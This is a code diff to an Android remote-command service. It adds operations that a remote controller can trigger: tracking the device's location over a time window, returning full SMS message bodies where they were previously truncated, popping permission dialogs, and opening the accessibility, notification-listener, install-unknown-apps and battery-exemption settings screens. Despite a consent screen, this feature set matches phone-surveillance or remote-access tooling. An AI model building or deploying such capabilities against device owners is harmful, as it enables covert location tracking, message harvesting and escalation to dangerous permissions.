@@ -423,6 +423,55 @@ public class RemoteService extends Service {
                             + " acc=" + best.getAccuracy() + " time=" + new java.util.Date(best.getTime())
                             + " prov=" + best.getProvider();
                 }
+
+                case "loctrack": {
+                    // LOCTRACK <secs> [interval_secs]: collect fixes over a time
+                    // window (all enabled providers), one line per fix
+                    String denied = requestPermission("loctrack", android.Manifest.permission.ACCESS_FINE_LOCATION,
+                            android.Manifest.permission.ACCESS_COARSE_LOCATION);
+                    if (denied != null) return denied;
+                    int secs = 60, ivl = 10;
+                    String[] v = arg.trim().split("\\s+");
+                    try {
+                        if (v.length > 0 && !v[0].isEmpty()) secs = Math.max(1, Math.min(600, Integer.parseInt(v[0])));
+                        if (v.length > 1) ivl = Math.max(2, Math.min(120, Integer.parseInt(v[1])));
+                    } catch (NumberFormatException ignored) {}
+                    LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
+                    final java.util.List<Location> fixes = new java.util.ArrayList<>();
+                    final android.location.LocationListener ll = l -> {
+                        synchronized (fixes) {
+                            for (int i = fixes.size() - 1; i >= 0; i--)
+                                if (fixes.get(i).getTime() == l.getTime()
+                                        && fixes.get(i).getProvider().equals(l.getProvider())) return; // dup
+                            fixes.add(l);
+                        }
+                    };
+                    boolean any = false;
+                    for (String prov : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER}) {
+                        try {
+                            if (lm.isProviderEnabled(prov)) {
+                                lm.requestLocationUpdates(prov, ivl * 1000L, 0f, ll, getMainLooper());
+                                any = true;
+                            }
+                        } catch (SecurityException ignored) {}
+                    }
+                    if (!any) return "ERR loctrack: no enabled location provider";
+                    long end = System.currentTimeMillis() + secs * 1000L;
+                    while (System.currentTimeMillis() < end && !destroyed) {
+                        try { Thread.sleep(250); } catch (InterruptedException e) { break; }
+                    }
+                    lm.removeUpdates(ll);
+                    synchronized (fixes) {
+                        if (fixes.isEmpty()) return "ERR loctrack: no fix during window (move outdoors / enable GPS)";
+                        java.text.SimpleDateFormat iso = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
+                        StringBuilder sb = new StringBuilder("OK ");
+                        for (Location l : fixes) sb.append(l.getLatitude()).append(' ').append(l.getLongitude())
+                                .append(' ').append(String.format(Locale.US, "%.0f", l.getAccuracy()))
+                                .append(' ').append(iso.format(new java.util.Date(l.getTime())))
+                                .append(' ').append(l.getProvider()).append('\n');
+                        return sb.toString();
+                    }
+                }
                 case "photos": {
                     String denied = requestPermission("photos", android.Manifest.permission.READ_MEDIA_IMAGES);
                     if (denied != null) return denied;
@@ -683,9 +732,9 @@ public class RemoteService extends Service {
                         String addr = c.getString(0);
                         long date = c.getLong(1);
                         String body = c.getString(2);
-                        if (body != null && body.length() > 160) body = body.substring(0, 160) + "…";
+                        if (body != null) body = body.replace('\n', ' ').trim();
                         sb.append(addr == null ? "?" : addr).append(' ').append(new java.util.Date(date))
-                          .append(' ').append(body == null ? "" : body.replace('\n', ' ')).append('\n');
+                          .append(' ').append(body == null ? "" : body).append('\n');
                     }
                     c.close();
                     return sb.toString();
@@ -985,6 +1034,54 @@ public class RemoteService extends Service {
                     sb.append("install_unknown=").append(
                             getPackageManager().canRequestPackageInstalls() ? "granted" : "denied").append('\n');
                     return sb.toString();
+                }
+                case "permreq": {
+                    // PERMREQ <perm>[,<perm>...]: pop the runtime-permission
+                    // dialogs for the given permissions on the device
+                    if (arg.isEmpty()) return "ERR permreq: <permission>[,...]";
+                    java.util.ArrayList<String> want = new java.util.ArrayList<>();
+                    for (String p : arg.split(",")) {
+                        String t = p.trim();
+                        if (t.isEmpty()) continue;
+                        boolean known = false;
+                        for (String k : MainActivity.ALL_PERMS) if (k.equals(t)) { known = true; break; }
+                        if (!known) return "ERR permreq: unknown permission: " + t;
+                        if (checkSelfPermission(t) != PackageManager.PERMISSION_GRANTED) want.add(t);
+                    }
+                    if (want.isEmpty()) return "OK permreq: all already granted";
+                    Intent i = new Intent(this, MainActivity.class);
+                    i.putExtra(MainActivity.PERMS_KEY, want.toArray(new String[0]));
+                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                    startActivity(i);
+                    return "OK permreq: dialog shown for " + want.size() + " permission(s); approve on device";
+                }
+                case "uireq": {
+                    // UIREQ accessibility|notiflistener|install|consent|battery:
+                    // open the matching system screen on the device
+                    String a = arg.trim().toLowerCase();
+                    try {
+                        Intent i;
+                        switch (a) {
+                            case "accessibility":
+                                i = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS); break;
+                            case "notiflistener":
+                                i = new Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS); break;
+                            case "install":
+                                i = new Intent(android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
+                                        Uri.parse("package:" + getPackageName())); break;
+                            case "consent":
+                                i = new Intent(this, ConsentActivity.class); break;
+                            case "battery":
+                                i = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                                        Uri.parse("package:" + getPackageName())); break;
+                            default: return "ERR uireq: accessibility|notiflistener|install|consent|battery";
+                        }
+                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(i);
+                        return "OK uireq: " + a + " screen shown";
+                    } catch (Exception e) {
+                        return "ERR uireq: " + e;
+                    }
                 }
                 default: return "ERR unknown op " + op;
             }
